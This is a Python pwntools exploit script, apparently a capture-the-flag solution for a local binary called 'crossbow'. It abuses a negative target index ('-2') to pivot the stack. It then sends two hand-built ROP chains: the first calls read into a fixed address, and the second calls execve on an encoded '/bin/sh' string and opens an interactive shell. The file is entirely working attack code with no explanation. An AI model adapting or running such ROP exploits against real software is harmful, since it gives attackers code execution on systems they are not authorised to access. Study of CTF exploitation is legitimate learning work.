#!/usr/bin/python3

from pwn import *

p = process("./crossbow")
# p = gdb.debug("./crossbow",'''
#               b* 0x0000000000401263
#               b* 0x0000000000401326
#               b* 0x40136d
#               b* 0x00000000004013EA
#               c
#               ''')

pop_rax = p64(0x0000000000401001)
pop_rdi = p64(0x0000000000401d6c)
pop_rsi = p64(0x000000000040566b)
pop_rdx = p64(0x0000000000401139)
syscall = p64(0x0000000000405346)
pop_rsp = p64(0x00000000004018b5)
leave = p64(0x000000000040136c)

p.sendlineafter("Select target to shoot:", b"-2")
payload = p64(0x000000000040dbe0) #new rbp
payload += pop_rax
payload += p64(0x00)
payload += pop_rdi
payload += p64(0x00)
payload += pop_rsi
payload += p64(0x000000000040dbe0)
payload += pop_rdx
payload += p64(0x200)
payload += syscall
payload += leave



p.sendlineafter("> ",payload)
payload = p64(0x000000000040dbe0) #new rbp
payload += pop_rax
payload += p64(0x3b)
payload += pop_rsi
payload += p64(0x00)
payload += pop_rdi
payload += p64(0x000000000040dc30)
payload += pop_rdx
payload += p64(0x00)
payload += syscall
payload += p64(29400045130965551)



p.sendline(payload)
p.interactive()




